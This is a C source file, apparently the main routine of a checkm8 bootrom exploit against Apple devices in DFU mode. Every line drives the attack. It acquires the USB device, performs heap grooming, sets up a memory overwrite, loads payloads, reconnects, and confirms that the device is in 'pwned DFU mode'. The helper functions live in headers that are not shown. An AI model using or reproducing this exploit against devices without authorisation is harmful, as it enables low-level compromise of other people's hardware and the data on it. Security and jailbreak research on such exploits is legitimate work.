#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <include/usbexec.h>
#include <include/checkm8.h>

int main(void)
{
	uint16_t vendorID = 0x5AC;
	uint16_t productID = 0x1227;
	int ret = 0;
	libusb_handler_t *dev = NULL;

	dev = acquire_device(vendorID, productID);
	if (dev == NULL) {
		return -1;
	}

	INFO("%s\n", dev->serialnumber);

	dev = reconnect_device(dev, vendorID, productID, 1);

	/* stage 1 */
	heap_grooming(dev);

	/*stage 2 */
	setup_overwrite(dev);

	/*stage 3 */
	load_payloads(dev);

	dev = reconnect_device(dev, vendorID, productID, 5);
	if (!dev) {
		ERROR("[e] failed execute payload.\n");
		return -1;
	}

	INFO("%s\n", dev->serialnumber);
	ret = is_pwned_dfu(dev);
	if (!ret) {
		ERROR("device not in Pwned DFU mode.");
		return -1;
	}

	printf("[+] device is now in pwned DFU mode\n");

	libusb_reset_device(dev->dev);
	free(dev);

	return 0;
}
